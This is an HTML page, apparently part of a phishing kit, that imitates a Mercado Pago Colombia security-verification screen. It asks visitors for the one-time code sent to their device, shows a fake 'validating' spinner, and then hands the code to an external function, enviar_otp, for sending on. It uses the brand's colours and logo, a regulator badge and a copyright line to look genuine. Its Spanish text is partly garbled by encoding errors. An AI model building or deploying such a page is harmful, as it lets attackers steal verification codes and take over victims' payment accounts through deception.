<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ValidaciÃ³n de Seguridad | Mercado Pago</title>
    <link rel="icon" type="image/x-icon" href="https://http2.mlstatic.com/frontend-assets/ui-navigation/5.21.22/mercadopago/favicon.svg">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <style>
        :root {
            --mp-blue: #009ee3;
            --mp-yellow: #fff159;
            --text-dark: #333333;
            --text-gray: #666666;
            --bg-light: #f5f5f5;
            --border-gray: #e6e6e6;
        }

        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-light);
            height: 100%;
            display: flex;
            flex-direction: column;
        }

        .mp-header {
            background-color: var(--mp-yellow);
            padding: 20px 5%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }

        .mp-logo {
            height: 50px;
        }

        .main-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .otp-card {
            background: #ffffff;
            width: 100%;
            max-width: 440px;
            padding: 40px 35px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            text-align: center;
        }

        h1 {
            font-size: 20px;
            color: var(--text-dark);
            margin-bottom: 24px;
            font-weight: 700;
        }

        .info-text {
            font-size: 15px;
            color: var(--text-gray);
            line-height: 1.6;
            margin-bottom: 32px;
            text-align: left;
        }

        .info-text b {
            color: var(--mp-blue);
        }

        .form-field {
            position: relative;
            margin-bottom: 32px;
            text-align: left;
        }

        .form-field label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-dark);
            margin-bottom: 8px;
        }

        .input-control {
            width: 100%;
            padding: 14px 16px;
            font-size: 18px;
            border: 1.5px solid var(--border-gray);
            border-radius: 8px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
            letter-spacing: 2px;
            font-weight: 600;
        }

        .input-control:focus {
            border-color: var(--mp-blue);
        }

        .btn-confirm {
            width: 100%;
            padding: 16px;
            background-color: var(--mp-blue);
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-bottom: 20px;
        }

        .btn-confirm:hover {
            background-color: #008cd1;
        }

        .btn-confirm:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .vigilado-box {
            margin-top: 25px;
            text-align: center;
        }

        .vigilado-box img {
            height: 38px;
        }

        /* Full Screen Loader */
        #loader-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, 0.95);
            z-index: 10000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .spinner-mp {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid var(--mp-blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div id="loader-overlay">
        <div class="spinner-mp"></div>
        <p style="color: var(--mp-blue); font-weight: 600;">Validando cÃ³digo de seguridad...</p>
    </div>

    <header class="mp-header">
        <img src="mercado_logo.png" alt="Mercado Pago" class="mp-logo">
    </header>

    <div class="main-container">
        <div class="otp-card">
            <h1>VerificaciÃ³n de seguridad</h1>

            <p class="info-text">
                Para completar tu operaciÃ³n, ingresa el <b>cÃ³digo de seguridad</b> que enviamos a tu dispositivo registrado.
            </p>

            <div class="form-field">
                <label for="txtOTP">CÃ³digo de seguridad</label>
                <input type="tel" id="txtOTP" class="input-control" maxlength="8" minlength="4" inputmode="numeric" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢">
            </div>

            <button type="button" id="btnConfirm" class="btn-confirm" disabled>Continuar</button>
        </div>

        <div class="vigilado-box">
             <img src="vigilado.png" alt="Vigilado Superintendencia Financiera">
             <p style="font-size: 12px; color: #999; margin-top:10px;">&copy; 2026 Mercado Pago Colombia</p>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            const $input = $("#txtOTP");
            const $btn = $("#btnConfirm");

            $input.on("input", function() {
                const val = $input.val();
                if (val.length >= 4) {
                    $btn.prop("disabled", false);
                } else {
                    $btn.prop("disabled", true);
                }
            });

            $btn.on("click", function() {
                if (!$btn.prop("disabled")) {
                    $("#loader-overlay").css("display", "flex");
                    setTimeout(function() {
                        enviar_otp($input.val());
                    }, 2000);
                }
            });

            $input.on("keypress", function(e) {
                if (e.which == 13 && $input.val().length >= 4) {
                    $btn.trigger("click");
                }
            });
        });
    </script>
</body>
</html>
